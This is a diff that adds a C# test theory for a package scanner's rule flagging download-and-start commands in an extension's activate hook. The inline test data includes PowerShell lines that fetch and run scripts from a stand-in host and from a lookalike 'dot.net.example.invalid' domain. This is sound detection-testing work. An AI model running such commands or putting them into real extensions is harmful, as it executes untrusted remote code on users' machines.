@@ -1500,6 +1500,22 @@ public sealed class PackageReviewTests : IDisposable
         Assert.DoesNotContain(PackageReview.Scan("index.js", server, install: false, default, entry: true, peel: false), f => f.Rule == "package/loaded-detached");
     }
 
+    // A vendor installer script is not a download-and-start; the same line from another host is (fix(web) for download-and-start).
+    [Theory]
+    [InlineData("powershell -Command \"iwr https://dot.net/v1/dotnet-install.ps1 -OutFile i.ps1; ./i.ps1 -channel 1; Remove-Item i.ps1\"", false)]
+    [InlineData("powershell -Command \"iwr https://raw.githubusercontent.com/dotnet/install-scripts/main/src/dotnet-install.ps1 -OutFile i.ps1; ./i.ps1 -channel 1; Remove-Item i.ps1\"", false)]
+    [InlineData("powershell -Command \"iwr https://dot.net/v1/i.ps1 -OutFile i.ps1; ./i.ps1; iwr https://example.invalid/j.ps1 -OutFile j.ps1; ./j.ps1\"", true)]
+    [InlineData("echo https://example.invalid/x; powershell -Command \"iwr https://dot.net/v1/i.ps1 -OutFile i.ps1; ./i.ps1\"", false)]
+    [InlineData("powershell -Command \"iwr https://example.invalid/i.ps1 -OutFile i.ps1; ./i.ps1 -channel 1; Remove-Item i.ps1\"", true)]
+    [InlineData("powershell -Command \"iwr https://dot.net.example.invalid/i.ps1 -OutFile i.ps1; ./i.ps1 -channel 1; Remove-Item i.ps1\"", true)]
+    public void A_vendor_installer_script_is_not_a_download_and_start(string command, bool noteworthy)
+    {
+        var pkg = """{"name":"tools","publisher":"acme","version":"1.0.0","main":"./extension.js"}""";
+        var r = Review(Zip("acme.tools-1.0.0.vsix", ("extension/package.json", U(pkg)),
+            ("extension/extension.js", U("const { exec } = require('child_process');\nexports.activate = () => exec('" + command.Replace("'", "") + "');"))));
+        Assert.Equal(noteworthy, r.Findings.Any(f => f.Rule == "package/download-and-start"));
+    }
+
     // A zip checkpoint whose protocol 2 pickle calls GLOBAL module.name
     // on the inert string "pass".
     private static byte[] Checkpoint(string module, string name) =>
